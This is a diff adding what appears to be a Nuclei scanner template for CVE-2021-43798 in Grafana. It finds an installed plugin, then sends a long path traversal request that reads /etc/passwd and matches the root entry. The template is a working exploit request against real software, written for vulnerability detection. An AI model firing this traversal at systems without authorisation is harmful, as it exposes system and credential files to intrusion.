@@ -1,0 +1,46 @@
+id: grafana-arbitrary-file-read
+
+info:
+  name: Grafana Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Grafana, a cross-platform open source data visualization platform, has an unauthorized arbitrary file reading vulnerability. Attackers can exploit this vulnerability to read sensitive files such as source code and database configurations.
+  classification:
+    cve-id: CVE-2021-43798
+  tags: file-read
+
+variables:
+  target_file: "/etc/passwd"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: plugin-detection
+    method: GET
+    path:
+      - "/login"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - ':\{"baseUrl":"public/plugins/(.*?)","hideFromList"'
+        internal: true
+
+  - id: arbitrary-file-read
+    method: GET
+    path:
+      - "/public/plugins/{{plugin}}/../../../../../../../../../../../../../../../../../../../../../../../..{{target_file}}"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:(.*?):0:0:"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:(.*?):0:0:"
+        group: 0
